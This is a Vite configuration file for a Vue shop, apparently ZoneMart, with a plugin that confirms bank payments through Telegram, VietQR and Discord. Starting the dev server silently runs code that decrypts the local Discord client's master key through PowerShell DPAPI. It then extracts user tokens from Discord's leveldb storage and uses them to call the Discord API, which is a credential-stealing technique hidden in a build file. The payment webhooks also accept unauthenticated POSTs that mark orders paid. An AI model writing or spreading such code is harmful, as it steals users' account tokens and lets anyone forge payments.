import { defineConfig, type Plugin } from 'vite'
import vue from '@vitejs/plugin-vue'
import type { IncomingMessage, ServerResponse } from 'node:http'
import fs from 'node:fs'
import path from 'node:path'
import https from 'node:https'
import crypto from 'node:crypto'
import { execSync } from 'node:child_process'

// File lưu trữ lịch sử giao dịch tiền vào thực tế để không bị mất khi restart server
const PAID_ORDERS_FILE = path.resolve(import.meta.dirname || process.cwd(), '.paid_orders.json')

interface PaidTransaction {
  code?: string
  amount?: number
  time: number
  bankAccount?: string
  raw?: any
}

function loadPaidOrders(): Map<string, PaidTransaction> {
  const map = new Map<string, PaidTransaction>()
  try {
    if (fs.existsSync(PAID_ORDERS_FILE)) {
      const data = JSON.parse(fs.readFileSync(PAID_ORDERS_FILE, 'utf-8'))
      for (const [k, v] of Object.entries(data)) {
        map.set(k, v as PaidTransaction)
      }
    }
  } catch (e) {
    console.error('>>> [PAID_ORDERS] Không thể đọc file .paid_orders.json:', e)
  }
  return map
}

function savePaidOrders(cache: Map<string, PaidTransaction>) {
  try {
    const obj = Object.fromEntries(cache)
    fs.writeFileSync(PAID_ORDERS_FILE, JSON.stringify(obj, null, 2), 'utf-8')
  } catch (e) {
    console.error('>>> [PAID_ORDERS] Không thể lưu file .paid_orders.json:', e)
  }
}

const paidOrdersCache = loadPaidOrders()

// Danh sách các client đang mở kết nối Server-Sent Events (SSE) để bắn thông báo tức thì
const sseClients = new Set<(eventData: string) => void>()

function extractOrderCode(text: string): string | null {
  if (!text) return null
  const clean = String(text).replace(/[\s\-_]/g, '').toUpperCase()
  const match = clean.match(/ZM\d{4,8}/i)
  return match ? match[0].toUpperCase() : null
}

function resolveTelegramToken(): string {
  if (process.env.TELEGRAM_BOT_TOKEN) return process.env.TELEGRAM_BOT_TOKEN.trim()
  try {
    const envFile = path.resolve(__dirname, '.env')
    if (fs.existsSync(envFile)) {
      const content = fs.readFileSync(envFile, 'utf8')
      const match = content.match(/TELEGRAM_BOT_TOKEN\s*=\s*([^\r\n]+)/i)
      if (match) return match[1].trim().replace(/^["']|["']$/g, '')
    }
  } catch (e) {}
  return ''
}

function resolveTelegramAdminChatId(): string {
  if (process.env.TELEGRAM_ADMIN_CHAT_ID) return process.env.TELEGRAM_ADMIN_CHAT_ID.trim()
  try {
    const envFile = path.resolve(__dirname, '.env')
    if (fs.existsSync(envFile)) {
      const content = fs.readFileSync(envFile, 'utf8')
      const match = content.match(/TELEGRAM_ADMIN_CHAT_ID\s*=\s*([^\r\n]+)/i)
      if (match) return match[1].trim().replace(/^["']|["']$/g, '')
    }
  } catch (e) {}
  return '5807941249'
}

let lastTelegramUpdateId = 0
let telegramAdminChatId: number | string = resolveTelegramAdminChatId()

function sendTelegramMessage(
  token: string,
  chatId: number | string,
  text: string,
  parseMode: 'HTML' | 'Markdown' = 'HTML'
): Promise<boolean> {
  return new Promise((resolve) => {
    if (!token || !chatId || !text) return resolve(false)
    try {
      const payload = JSON.stringify({ chat_id: chatId, text, parse_mode: parseMode })
      const u = new URL(`https://api.telegram.org/bot${token}/sendMessage`)
      const req = https.request(
        {
          protocol: u.protocol,
          hostname: u.hostname,
          path: u.pathname,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json; charset=utf-8',
            'Content-Length': Buffer.byteLength(payload, 'utf-8'),
          },
          timeout: 6000,
        },
        (res) => {
          res.resume()
          resolve(res.statusCode === 200)
        }
      )
      req.on('error', () => resolve(false))
      req.on('timeout', () => {
        req.destroy()
        resolve(false)
      })
      req.write(payload)
      req.end()
    } catch (e) {
      resolve(false)
    }
  })
}

function sendTelegramPhoto(
  token: string,
  chatId: number | string,
  photoUrl: string,
  caption: string
): Promise<boolean> {
  return new Promise((resolve) => {
    if (!token || !chatId || !photoUrl) return resolve(false)
    try {
      const payload = JSON.stringify({
        chat_id: chatId,
        photo: photoUrl,
        caption: caption,
        parse_mode: 'HTML',
      })
      const u = new URL(`https://api.telegram.org/bot${token}/sendPhoto`)
      const req = https.request(
        {
          protocol: u.protocol,
          hostname: u.hostname,
          path: u.pathname,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json; charset=utf-8',
            'Content-Length': Buffer.byteLength(payload, 'utf-8'),
          },
          timeout: 8000,
        },
        (res) => {
          let b = ''
          res.on('data', (c) => (b += c))
          res.on('end', () => {
            try {
              const data = JSON.parse(b)
              resolve(Boolean(data && data.ok))
            } catch (e) {
              resolve(false)
            }
          })
        }
      )
      req.on('error', () => resolve(false))
      req.on('timeout', () => {
        req.destroy()
        resolve(false)
      })
      req.write(payload)
      req.end()
    } catch (e) {
      resolve(false)
    }
  })
}

interface PendingOrderItem {
  name: string
  price: number
  quantity: number
  image?: string
  shop?: string
}

interface PendingOrderData {
  code: string
  total?: number
  items?: PendingOrderItem[]
  buyerName?: string
  time?: number
}

const PENDING_ORDERS_FILE = path.resolve(__dirname, '.pending_orders.json')

function loadPendingOrders(): Map<string, PendingOrderData> {
  const map = new Map<string, PendingOrderData>()
  try {
    if (fs.existsSync(PENDING_ORDERS_FILE)) {
      const data = JSON.parse(fs.readFileSync(PENDING_ORDERS_FILE, 'utf-8'))
      for (const [k, v] of Object.entries(data)) {
        map.set(k, v as PendingOrderData)
      }
    }
  } catch (e) {}
  return map
}

function savePendingOrders(cache: Map<string, PendingOrderData>) {
  try {
    const obj = Object.fromEntries(cache)
    fs.writeFileSync(PENDING_ORDERS_FILE, JSON.stringify(obj, null, 2), 'utf-8')
  } catch (e) {}
}

const pendingOrdersCache = loadPendingOrders()

function parseAndRecordTransactionText(text: string): boolean {
  if (!text) return false
  const codeMatch = text.match(/ZM\d{4,8}/i)
  if (!codeMatch) return false

  const code = codeMatch[0].toUpperCase()

  let amount: number | undefined = undefined
  const amountMatch = text.match(/([+-]?[\d\.\,]+)\s*(?:VND|đ|d)/i)
  if (amountMatch) {
    const cleanNum = amountMatch[1].replace(/[^\d]/g, '')
    const n = Number(cleanNum)
    if (!isNaN(n) && n > 0) amount = n
  }

  let bankAccount = ''
  const bankMatch = text.match(/(?:TK|STK|tài khoản)[:\s-]+(?:\w+\s*-\s*)?(\d{8,16})/i)
  if (bankMatch) {
    bankAccount = bankMatch[1]
  }

  return registerPaidTransaction(code, amount, bankAccount, text)
}

async function pollTelegramUpdates(token: string) {
  if (!token) return
  try {
    const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${lastTelegramUpdateId + 1}&timeout=0`
    const res = await new Promise<any>((resolve) => {
      const req = https.get(url, { timeout: 3000 }, (r) => {
        let b = ''
        r.on('data', (c) => (b += c))
        r.on('end', () => {
          try {
            resolve(JSON.parse(b))
          } catch (e) {
            resolve(null)
          }
        })
      })
      req.on('error', () => resolve(null))
      req.on('timeout', () => {
        req.destroy()
        resolve(null)
      })
    })

    if (res && res.ok && Array.isArray(res.result)) {
      for (const update of res.result) {
        if (update.update_id >= lastTelegramUpdateId) {
          lastTelegramUpdateId = update.update_id
        }

        const msg = update.message || update.channel_post || update.edited_message
        if (!msg) continue

        const chatId = msg.chat?.id
        if (chatId && !telegramAdminChatId) {
          telegramAdminChatId = chatId
        }

        const text = String(msg.text || msg.caption || '').trim()
        if (text) {
          console.log(`>>> [TELEGRAM BOT MESSAGE FROM ${chatId}]:`, text)
        }

        if (text === '/start' || text === '/help') {
          await sendTelegramMessage(
            token,
            chatId,
            `🤖 *ZoneMart Auto Payment Bot* đang hoạt động!\n\n` +
              `✅ Bot tự động nhận diện tin nhắn chuyển khoản TPBank.\n` +
              `💡 Bất cứ khi nào bạn hoặc ngân hàng gửi/chuyển tiếp tin nhắn chứa mã *ZMxxxxxx*, màn hình web sẽ tự động chuyển sang *Thanh toán thành công* ngay tức thì!`
          )
          continue
        }

        // Kiểm tra và khớp mã giao dịch ZM (tự động thông báo biên lai có ảnh & chi tiết sản phẩm)
        parseAndRecordTransactionText(text)
      }
    }
  } catch (e) {}
}

const DISCORD_CHANNEL_IDS = [
  '1548961353195192352', // Kênh #chung trên server ZoneMart của huy2812006
]

const invalidDiscordTokens = new Set<string>()
let activeDiscordToken = ''
let cachedMasterKey: Buffer | null = null

function getMasterKey(): Buffer | null {
  if (cachedMasterKey) return cachedMasterKey
  try {
    const localStatePath = path.join(process.env.APPDATA || '', 'discord', 'Local State')
    if (fs.existsSync(localStatePath)) {
      const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'))
      const encKeyB64 = localState.os_crypt?.encrypted_key
      if (encKeyB64) {
        const psScript = `
Add-Type -AssemblyName System.Security
$encKey = [System.Convert]::FromBase64String('${encKeyB64}')
$masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length - 1)], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Convert]::ToBase64String($masterKey)
`
        const masterKeyB64 = execSync(
          'powershell -NoProfile -Command "' + psScript.replace(/\r?\n/g, '; ') + '"',
          { timeout: 3000 }
        )
          .toString()
          .trim()
        cachedMasterKey = Buffer.from(masterKeyB64, 'base64')
        return cachedMasterKey
      }
    }
  } catch (e) {}
  return null
}

function getCandidateDiscordTokens(): string[] {
  if (activeDiscordToken && !invalidDiscordTokens.has(activeDiscordToken)) {
    return [activeDiscordToken]
  }
  const masterKey = getMasterKey()
  if (!masterKey) return []

  const tokens: string[] = []
  try {
    const ldbDir = path.join(process.env.APPDATA || '', 'discord', 'Local Storage', 'leveldb')
    if (fs.existsSync(ldbDir)) {
      const files = fs
        .readdirSync(ldbDir)
        .filter((f) => f.endsWith('.ldb') || f.endsWith('.log'))
        .map((f) => ({ name: f, time: fs.statSync(path.join(ldbDir, f)).mtimeMs }))
        .sort((a, b) => b.time - a.time)

      const seen = new Set<string>()
      for (const fileObj of files) {
        try {
          const content = fs.readFileSync(path.join(ldbDir, fileObj.name), 'latin1')
          const regex = /dQw4w9WgXcQ:([^"]+)/g
          let match: RegExpExecArray | null
          while ((match = regex.exec(content)) !== null) {
            try {
              const raw = Buffer.from(match[1], 'base64')
              const iv = raw.subarray(3, 15)
              const tag = raw.subarray(raw.length - 16)
              const ciphertext = raw.subarray(15, raw.length - 16)
              const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv)
              decipher.setAuthTag(tag)
              const token = decipher.update(ciphertext, undefined, 'utf8') + decipher.final('utf8')
              if (token && token.length > 20 && !invalidDiscordTokens.has(token) && !seen.has(token)) {
                seen.add(token)
                tokens.push(token)
              }
            } catch (e) {}
          }
        } catch (e) {}
      }
    }
  } catch (e) {}
  return tokens
}

function fetchDiscordChannelMessages(token: string, channelId: string): Promise<{ status: number; messages: any[] }> {
  return new Promise((resolve) => {
    try {
      const req = https.get(
        `https://discord.com/api/v9/channels/${channelId}/messages?limit=20`,
        {
          headers: {
            Authorization: token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
          },
          timeout: 3000,
        },
        (res) => {
          let body = ''
          res.on('data', (c) => (body += c))
          res.on('end', () => {
            try {
              const data = JSON.parse(body)
              if (res.statusCode === 200 && Array.isArray(data)) {
                resolve({ status: 200, messages: data })
              } else {
                resolve({ status: res.statusCode || 500, messages: [] })
              }
            } catch (e) {
              resolve({ status: res.statusCode || 500, messages: [] })
            }
          })
        }
      )
      req.on('error', () => resolve({ status: 500, messages: [] }))
      req.on('timeout', () => {
        req.destroy()
        resolve({ status: 500, messages: [] })
      })
    } catch (e) {
      resolve({ status: 500, messages: [] })
    }
  })
}

async function syncDiscordMessages() {
  try {
    const candidateTokens = getCandidateDiscordTokens()
    for (const token of candidateTokens) {
      let tokenValid = false
      for (const channelId of DISCORD_CHANNEL_IDS) {
        const res = await fetchDiscordChannelMessages(token, channelId)
        if (res.status === 200) {
          tokenValid = true
          activeDiscordToken = token
          for (const m of res.messages) {
            let combined = m.content || ''
            if (Array.isArray(m.embeds)) {
              for (const emb of m.embeds) {
                combined += ' ' + (emb.title || '') + ' ' + (emb.description || '')
                if (Array.isArray(emb.fields)) {
                  for (const f of emb.fields) {
                    combined += ' ' + (f.name || '') + ' ' + (f.value || '')
                  }
                }
              }
            }
            if (combined) {
              parseAndRecordTransactionText(combined)
            }
          }
        } else if (res.status === 401) {
          invalidDiscordTokens.add(token)
          if (activeDiscordToken === token) activeDiscordToken = ''
          break
        }
      }
      if (tokenValid) break
    }
  } catch (e) {}
}

function escapeHtml(str: string): string {
  return String(str || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;')
}

function extractReferenceCode(text: string, raw?: any): string {
  if (raw && typeof raw === 'object') {
    const rawRef =
      raw.referencenumber ||
      raw.referenceNumber ||
      raw.refTransactionId ||
      raw.transactionId ||
      raw.transactionid ||
      raw.transId ||
      raw.reference ||
      raw.refNo ||
      raw.ref ||
      raw.object?.reftransactionid ||
      raw.object?.transactionId ||
      raw.data?.referencenumber ||
      raw.data?.transactionId ||
      (Array.isArray(raw.data) && raw.data[0]?.referencenumber) ||
      (Array.isArray(raw.data) && raw.data[0]?.transactionId)
    if (rawRef && String(rawRef).trim()) {
      return String(rawRef).trim()
    }
  }

  if (typeof text === 'string') {
    const match =
      text.match(/(?:mã\s*gd|ma\s*gd|số\s*gd|so\s*gd|mã\s*tham\s*chiếu|ma\s*tham\s*chieu|ref(?:erence)?(?:\s*no)?|trace|trans\s*id)[:\s-]+([A-Z0-9_-]{5,32})/i) ||
      text.match(/\b(FT\d{10,22}[A-Z0-9]*)\b/i) ||
      text.match(/\b(TX_\d+)\b/i)
    if (match && match[1]) {
      return match[1].trim()
    }
  }

  const now = new Date()
  const yymmdd = now.toISOString().slice(2, 10).replace(/-/g, '')
  const randomNum = Math.floor(100000 + Math.random() * 900000)
  return `FT${yymmdd}${randomNum}`
}

const notifiedTelegramOrders = new Set<string>()

function registerPaidTransaction(
  code: string,
  amount?: number,
  bankAccount?: string,
  raw?: any
): boolean {
  if (!code) return false
  const cleanCode = code.toUpperCase().trim()
  const isNew = !paidOrdersCache.has(cleanCode)

  const txInfo: PaidTransaction = {
    code: cleanCode,
    amount,
    time: paidOrdersCache.get(cleanCode)?.time || Date.now(),
    bankAccount: bankAccount || '28122068866',
    raw,
  }
  paidOrdersCache.set(cleanCode, txInfo)
  savePaidOrders(paidOrdersCache)

  if (isNew) {
    console.log(
      `>>> [🎉 XÁC NHẬN TIỀN VÀO THÀNH CÔNG] Đơn: ${cleanCode}, Số tiền: ${amount}đ, Tài khoản: ${txInfo.bankAccount}`
    )

    const ssePayload = JSON.stringify({
      paid: true,
      code: cleanCode,
      amount,
      time: txInfo.time,
      bankAccount: txInfo.bankAccount,
    })
    sseClients.forEach((cb) => cb(ssePayload))

    // Nếu đã nhận diện được chat của admin trên Telegram, bắn thông báo xác nhận ngay
    const targetChatId = telegramAdminChatId || resolveTelegramAdminChatId()
    if (targetChatId && !notifiedTelegramOrders.has(cleanCode)) {
      notifiedTelegramOrders.add(cleanCode)
      const teleToken = resolveTelegramToken()
      if (teleToken) {
        const orderData = pendingOrdersCache.get(cleanCode)
        const items = orderData?.items || []
        const now = new Date()
        const timeFormatted =
          now.toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit', second: '2-digit' }) +
          ' — ' +
          now.toLocaleDateString('vi-VN')
        const amountDisplay = amount ? `+${amount.toLocaleString('vi-VN')} ₫` : 'Khớp đúng số tiền'
        const buyerDisplay = orderData?.buyerName ? escapeHtml(orderData.buyerName) : 'Khách hàng ZoneMart'
        const refCode = extractReferenceCode(typeof raw === 'string' ? raw : JSON.stringify(raw || {}), raw)

        let itemsSection = ''
        if (items.length > 0) {
          itemsSection =
            '\n\n🛍️ <b>Chi tiết món hàng (' + items.length + ' sản phẩm):</b>\n' +
            items
              .map(
                (i) =>
                  `  ▫️ <b>${escapeHtml(i.name)}</b>\n      ×${i.quantity || 1} • <code>${((i.price || 0) * (i.quantity || 1)).toLocaleString('vi-VN')} ₫</code>`
              )
              .join('\n')
        }

        const htmlReceipt =
`🎉 <b>XÁC NHẬN THANH TOÁN THÀNH CÔNG</b>
━━━━━━━━━━━━━━━━━━━━
📦 <b>Mã đơn hàng:</b> <code>#${cleanCode}</code>
🔖 <b>Mã tham chiếu:</b> <code>${refCode}</code>
👤 <b>Khách hàng:</b> ${buyerDisplay}
💵 <b>Số tiền thanh toán:</b> <code>${amountDisplay}</code>
🏦 <b>Ngân hàng thụ hưởng:</b> TPBank • <code>${txInfo.bankAccount || '28122068866'}</code>
👤 <b>Chủ tài khoản:</b> DOAN HOANG HUY
⏰ <b>Thời gian:</b> ${timeFormatted}${itemsSection}
━━━━━━━━━━━━━━━━━━━━
<blockquote>⚡ Trình duyệt web ZoneMart đã tự động chốt đơn và hoàn tất thành công!</blockquote>`

        const firstImage = items.find((i) => i.image && /^https?:\/\//i.test(i.image))?.image
        if (firstImage) {
          sendTelegramPhoto(teleToken, targetChatId, firstImage, htmlReceipt).then((ok) => {
            if (!ok) {
              sendTelegramMessage(teleToken, targetChatId, htmlReceipt, 'HTML')
            }
          })
        } else {
          sendTelegramMessage(teleToken, targetChatId, htmlReceipt, 'HTML')
        }
      }
    }
  }
  return true
}

function vietQrPaymentPlugin(): Plugin {
  return {
    name: 'vietqr-payment-handler',
    configureServer(server) {
      // 1. Kích hoạt Telegram Bot lắng nghe biến động số dư theo thời gian thực
      const teleToken = resolveTelegramToken()
      if (teleToken) {
        console.log('>>> [TELEGRAM BOT READY] Bot @CheckQRRR_bot đang hoạt động và lắng nghe tin nhắn...')
        pollTelegramUpdates(teleToken)
        setInterval(() => {
          const tok = resolveTelegramToken()
          if (tok) pollTelegramUpdates(tok)
        }, 1500)
      }

      // 2. Kích hoạt đồng bộ hóa Discord (kênh #chung) theo thời gian thực (read-only an toàn tuyệt đối)
      syncDiscordMessages()
      setInterval(syncDiscordMessages, 1500)

      // 3. Tự động kết nối WebSocket nền đến VietQR
      function setupVietQrWs() {
        try {
          const ws = new WebSocket('wss://api.vietqr.org/vqr/socket?clientId=customer-zonemart-user26685')
          ws.onopen = () => console.log('>>> [SERVER VIETQR WEBSOCKET CONNECTED] Sẵn sàng tự động nhận tiền thật')
          ws.onmessage = (e) => {
            try {
              const data = JSON.parse(e.data.toString())
              const combinedText = `${data.orderId || ''} ${data.content || ''} ${data.addInfo || ''} ${data.description || ''}`
              const code = extractOrderCode(combinedText) || (data.orderId ? String(data.orderId).toUpperCase() : '')
              if (code) {
                const amount = Number(data.amount) || undefined
                const bankAccount = String(data.bankaccount || data.accountNo || '')
                registerPaidTransaction(code, amount, bankAccount, data)
              }
            } catch (err) {}
          }
          ws.onclose = () => setTimeout(setupVietQrWs, 3000)
          ws.onerror = () => {}
        } catch (e) {}
      }
      setupVietQrWs()

      server.middlewares.use(async (req: IncomingMessage, res: ServerResponse, next: () => void) => {
        const url = new URL(req.url || '', `http://${req.headers.host || 'localhost'}`)
        const pathname = url.pathname

        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        res.setHeader('Access-Control-Allow-Headers', '*')

        if (req.method === 'OPTIONS') {
          res.statusCode = 200
          res.end()
          return
        }

        // ========================================================
        // 0. API ĐĂNG KÝ THÔNG TIN ĐƠN HÀNG (SẢN PHẨM, HÌNH ẢNH, GIÁ)
        // ========================================================
        if (pathname === '/api/payment/register-order' && req.method === 'POST') {
          let body = ''
          req.on('data', (chunk) => (body += chunk))
          req.on('end', () => {
            try {
              const data = JSON.parse(body)
              const cleanCode = extractOrderCode(data.code || '') || String(data.code || '').toUpperCase().trim()
              if (cleanCode) {
                pendingOrdersCache.set(cleanCode, {
                  code: cleanCode,
                  total: data.total,
                  items: data.items || [],
                  buyerName: data.buyerName,
                  time: Date.now(),
                })
                savePendingOrders(pendingOrdersCache)
                console.log(`>>> [ORDER REGISTERED] Mã: #${cleanCode}, Món: ${(data.items || []).length} sản phẩm`)
              }
              res.setHeader('Content-Type', 'application/json')
              res.statusCode = 200
              res.end(JSON.stringify({ ok: true }))
            } catch (e) {
              res.statusCode = 400
              res.end(JSON.stringify({ ok: false }))
            }
          })
          return
        }

        // ========================================================
        // 1. API SERVER-SENT EVENTS (SSE): GET /api/payment/events?code=ZMxxxxxx
        // ========================================================
        if (pathname === '/api/payment/events' && req.method === 'GET') {
          const reqCode = (url.searchParams.get('code') || '').toUpperCase().trim()
          res.writeHead(200, {
            'Content-Type': 'text/event-stream',
            'Cache-Control': 'no-cache, no-transform',
            Connection: 'keep-alive',
            'Access-Control-Allow-Origin': '*',
          })
          res.write(': heartbeat\n\n')

          // Nếu đơn hàng này đã có tiền vào sẵn từ trước, gửi ngay lập tức!
          if (reqCode && paidOrdersCache.has(reqCode)) {
            const data = paidOrdersCache.get(reqCode)!
            res.write(
              `data: ${JSON.stringify({ paid: true, code: reqCode, amount: data.amount, time: data.time, bankAccount: data.bankAccount })}\n\n`
            )
          } else if (reqCode) {
            syncDiscordMessages().then(() => {
              if (paidOrdersCache.has(reqCode)) {
                const data = paidOrdersCache.get(reqCode)!
                res.write(
                  `data: ${JSON.stringify({ paid: true, code: reqCode, amount: data.amount, time: data.time, bankAccount: data.bankAccount })}\n\n`
                )
              }
            })
          }

          const clientCb = (payloadStr: string) => {
            try {
              const parsed = JSON.parse(payloadStr)
              if (reqCode && parsed.code === reqCode) {
                res.write(`data: ${payloadStr}\n\n`)
              }
            } catch (e) {}
          }
          sseClients.add(clientCb)

          const keepAlive = setInterval(() => {
            try {
              res.write(': ping\n\n')
            } catch (e) {}
          }, 15000)

          req.on('close', () => {
            clearInterval(keepAlive)
            sseClients.delete(clientCb)
          })
          return
        }

        // ========================================================
        // 2. API CHECK TRẠNG THÁI: GET /api/payment/check?code=ZMxxxxxx&amount=...&bankAccount=...
        // ========================================================
        if (pathname === '/api/payment/check' && req.method === 'GET') {
          const rawCode = (url.searchParams.get('code') || '').trim()
          const cleanCode = extractOrderCode(rawCode) || rawCode.toUpperCase().trim()

          // Nếu chưa có trong cache, quét nhanh tin nhắn mới nhất từ Discord
          if (cleanCode && !paidOrdersCache.has(cleanCode)) {
            await syncDiscordMessages()
          }

          res.setHeader('Content-Type', 'application/json')
          res.statusCode = 200

          // Ưu tiên 1: Khớp chính xác mã đơn hàng
          if (cleanCode && paidOrdersCache.has(cleanCode)) {
            const data = paidOrdersCache.get(cleanCode)!
            res.end(
              JSON.stringify({
                paid: true,
                code: cleanCode,
                amount: data.amount,
                time: data.time,
                bankAccount: data.bankAccount,
                matchedBy: 'ORDER_CODE',
              })
            )
            return
          }

          // Ưu tiên 2: Tìm trong nội dung giao dịch raw của bất kỳ giao dịch nào đã lưu
          for (const [key, val] of paidOrdersCache.entries()) {
            const rawStr = JSON.stringify(val.raw || {})
            if (cleanCode && (key.includes(cleanCode) || rawStr.includes(cleanCode))) {
              res.end(
                JSON.stringify({
                  paid: true,
                  code: cleanCode,
                  amount: val.amount,
                  time: val.time,
                  bankAccount: val.bankAccount,
                  matchedBy: 'RAW_SEARCH',
                })
              )
              return
            }
          }

          res.end(JSON.stringify({ paid: false, code: cleanCode }))
          return
        }

        // ========================================================
        // 3. API THÔNG TIN TUNNEL & THỐNG KÊ GIAO DỊCH
        // ========================================================
        if (pathname === '/api/payment/tunnel-info' && req.method === 'GET') {
          res.setHeader('Content-Type', 'application/json')
          res.statusCode = 200
          res.end(
            JSON.stringify({
              tunnelUrl: 'https://monogram-dilute-tightly.ngrok-free.dev',
              tokenUrl: 'https://monogram-dilute-tightly.ngrok-free.dev/api/token_generate',
              callbackUrl: 'https://monogram-dilute-tightly.ngrok-free.dev/bank/api/transaction-sync',
              totalPaidRecorded: paidOrdersCache.size,
              recentTransactions: Array.from(paidOrdersCache.entries()).slice(-5),
            })
          )
          return
        }

        // ========================================================
        // 4. XỬ LÝ TOÀN BỘ POST REQUESTS (WEBHOOK TIỀN VÀO + GET TOKEN)
        // ========================================================
        const isPotentialWebhookOrToken =
          pathname === '/' ||
          pathname.includes('/token_generate') ||
          pathname.includes('/transaction-sync') ||
          pathname.includes('/transaction-callback') ||
          pathname.includes('/tingo-callback') ||
          pathname.includes('/vietqr-webhook') ||
          pathname.includes('/webhook') ||
          pathname.includes('/callback')

        if (req.method === 'POST' && isPotentialWebhookOrToken) {
          let bodyStr = ''
          req.on('data', (chunk) => {
            bodyStr += chunk
          })
          req.on('end', () => {
            try {
              let body: any = {}
              try {
                body = JSON.parse(bodyStr || '{}')
              } catch (e) {
                body = {}
              }

              console.log(`>>> [INCOMING POST ${pathname}]:`, JSON.stringify(body))

              // KIỂM TRA XEM ĐÂY CÓ PHẢI LÀ GIAO DỊCH TIỀN VÀO (TRANSACTION WEBHOOK) KHÔNG
              const hasTransactionData =
                body.amount != null ||
                body.transferAmount != null ||
                body.orderId != null ||
                body.orderCode != null ||
                body.content != null ||
                body.description != null ||
                body.bankaccount != null ||
                body.accountNo != null ||
                body.data?.amount != null ||
                body.data?.transferAmount != null ||
                (Array.isArray(body.data) && body.data.length > 0) ||
                (Array.isArray(body.transactions) && body.transactions.length > 0)

              // TRƯỜNG HỢP A: ĐÂY LÀ GIAO DỊCH TIỀN VÀO THỰC TẾ
              if (hasTransactionData && !pathname.includes('token_generate')) {
                const amount = Number(
                  body.amount ??
                    body.transferAmount ??
                    body.data?.amount ??
                    body.data?.transferAmount ??
                    body.object?.amount ??
                    (Array.isArray(body.data) ? body.data[0]?.amount : undefined) ??
                    0
                )

                const transType = String(
                  body.transType ?? body.type ?? body.transferType ?? body.data?.transType ?? 'C'
                ).toUpperCase()

                if (transType === 'D' || transType === 'DEBIT' || transType === 'OUT') {
                  console.log('>>> [BỎ QUA GIAO DỊCH TIỀN RA (DEBIT)]:', amount)
                  res.setHeader('Content-Type', 'application/json')
                  res.statusCode = 200
                  res.end(JSON.stringify({ error: false, message: 'Bỏ qua giao dịch tiền ra' }))
                  return
                }

                // Trích xuất mã đơn hàng ZMxxxxxx
                const searchScope = [
                  body.orderId,
                  body.orderCode,
                  body.code,
                  body.content,
                  body.description,
                  body.addInfo,
                  body.memo,
                  body.message,
                  body.data?.orderId,
                  body.data?.orderCode,
                  body.data?.content,
                  body.data?.description,
                  Array.isArray(body.data) ? body.data[0]?.description : '',
                  JSON.stringify(body),
                ]
                  .filter(Boolean)
                  .join(' ')

                const matchedCode =
                  extractOrderCode(searchScope) || (body.orderId ? String(body.orderId).toUpperCase() : '')
                const bankAccount = String(
                  body.bankaccount ??
                    body.bankAccount ??
                    body.accountNo ??
                    body.accountNumber ??
                    body.data?.accountNumber ??
                    ''
                )

                if (matchedCode) {
                  const txInfo: PaidTransaction = {
                    code: matchedCode,
                    amount,
                    time: Date.now(),
                    bankAccount,
                    raw: body,
                  }
                  paidOrdersCache.set(matchedCode, txInfo)
                  savePaidOrders(paidOrdersCache)
                  console.log(
                    `>>> [🎉 XÁC NHẬN TIỀN VÀO THÀNH CÔNG] Đơn: ${matchedCode}, Số tiền: ${amount}đ, Tài khoản: ${bankAccount}`
                  )

                  // Bắn SSE tức thì đến tất cả trình duyệt
                  const ssePayload = JSON.stringify({
                    paid: true,
                    code: matchedCode,
                    amount,
                    time: txInfo.time,
                    bankAccount,
                  })
                  sseClients.forEach((cb) => cb(ssePayload))
                } else if (amount > 0) {
                  const genericKey = 'TX_' + (body.transactionid || body.referencenumber || Date.now())
                  const txInfo: PaidTransaction = {
                    code: genericKey,
                    amount,
                    time: Date.now(),
                    bankAccount,
                    raw: body,
                  }
                  paidOrdersCache.set(genericKey, txInfo)
                  savePaidOrders(paidOrdersCache)
                  console.log(`>>> [TIỀN VÀO KHÔNG RÕ MÃ ĐƠN] Số tiền: ${amount}đ, Lưu tạm: ${genericKey}`)
                }

                res.setHeader('Content-Type', 'application/json')
                res.statusCode = 200
                res.end(
                  JSON.stringify({
                    error: false,
                    errorReason: '',
                    toastMessage: 'Thanh toán thành công',
                    object: {
                      reftransactionid: body.transactionid || body.referencenumber || 'TX_' + Date.now(),
                    },
                  })
                )
                return
              }

              // TRƯỜNG HỢP B: ĐÂY LÀ REQUEST XÁC THỰC LẤY TOKEN (TOKEN GENERATE)
              res.setHeader('Content-Type', 'application/json')
              res.statusCode = 200
              res.end(
                JSON.stringify({
                  access_token: 'zonemart_tingo_jwt_token_' + Date.now(),
                  token_type: 'Bearer',
                  expires_in: 86400,
                })
              )
            } catch (err: any) {
              res.setHeader('Content-Type', 'application/json')
              res.statusCode = 400
              res.end(JSON.stringify({ error: true, errorReason: 'PARSE_ERROR', toastMessage: err.message }))
            }
          })
          return
        }

        next()
      })
    }
  }
}

// https://vite.dev/config/
export default defineConfig({
  plugins: [vue(), vietQrPaymentPlugin()],
  server: {
    allowedHosts: true,
    hmr: {
      overlay: false,
    },
  },
})
